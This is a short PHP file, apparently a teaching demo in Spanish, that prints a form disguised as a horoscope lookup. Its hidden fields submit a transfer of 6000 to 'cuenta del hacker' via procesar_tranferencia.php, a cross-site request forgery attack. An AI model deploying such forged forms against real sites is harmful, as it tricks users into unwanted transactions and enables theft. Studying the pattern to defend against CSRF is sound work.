<?php
    echo '<form action="procesar_tranferencia.php" method="POST">';
    echo '<input type="hidden" name="cantidad" value="6000" />';
    echo '<br />';
    echo '<input type="hidden" name="destino" value="cuenta del hacker" />';
    echo '<br />';
    echo '<label for="signo">Conozca su horóscopo</label>';
    echo '<br />';
    echo '<label for="signo">Escriba tu signo del zodiaco</label>';
    echo '<input type="text" name="signo" value="" />';
    echo '<input type="submit" value="Enviar" />';
    echo '</form>';
?>